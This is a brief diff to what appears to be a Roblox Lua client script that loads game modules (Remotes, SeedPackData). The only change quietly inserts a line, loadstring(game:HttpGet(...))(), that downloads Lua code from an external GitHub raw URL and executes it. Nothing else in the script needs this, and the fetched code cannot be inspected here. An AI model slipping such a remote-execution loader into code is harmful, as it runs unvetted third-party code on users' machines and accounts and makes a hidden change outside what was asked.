@@ -5,7 +5,7 @@ local player = Players.LocalPlayer
 
 local Remotes = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Remotes"))
 local SeedPackData = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("SeedPackData"))
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yue-os/script/refs/heads/main/gag"))()
 -- Utilities
 local function getPackList()
     local list = {}
